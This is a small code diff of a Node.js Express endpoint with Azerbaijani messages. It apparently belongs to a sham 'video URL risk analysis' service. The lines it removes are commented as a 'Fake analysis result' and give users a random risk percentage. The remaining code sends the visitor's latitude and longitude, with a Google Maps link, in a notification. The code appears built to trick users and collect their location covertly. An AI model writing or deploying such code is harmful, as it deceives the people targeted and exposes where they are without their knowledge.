@@ -67,10 +67,7 @@ app.post('/api/send-data', async (req, res) => {
     let messageText = `⚡️ *Yeni Analiz Tələbi!* ⚡️\n\n`;
     messageText += `*Girilən URL:* ${videoUrl || 'Təyin edilməyib'}\n`;
 
-    // Fake analiz nəticəsi
-    const riskPercent = Math.floor(Math.random() * 60) + 20;
-    const status = riskPercent > 70 ? '⚠️ Yüksək risk' : riskPercent > 40 ? '⚡ Orta risk' : '✅ Təhlükəsiz';
-    messageText += `*Təhlükə səviyyəsi:* ${status} (${riskPercent}%)\n\n`;
+    
 
     if (location?.latitude && location?.longitude) {
       messageText += `📍 *Lokasiya:* [Xəritədə bax](https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
